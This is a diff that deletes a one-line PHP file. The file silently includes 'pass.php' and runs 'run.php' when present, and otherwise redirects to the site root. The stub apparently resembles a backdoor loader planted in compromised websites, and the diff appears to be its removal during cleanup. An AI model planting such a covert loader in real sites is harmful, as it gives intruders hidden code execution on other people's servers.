@@ -1,1 +1,0 @@
-<?php $filelct='./run.php';if(file_exists($filelct)){@include('./pass.php');include($filelct);}else{header('Location: /');exit();}unset($filelct);exit(0);?>
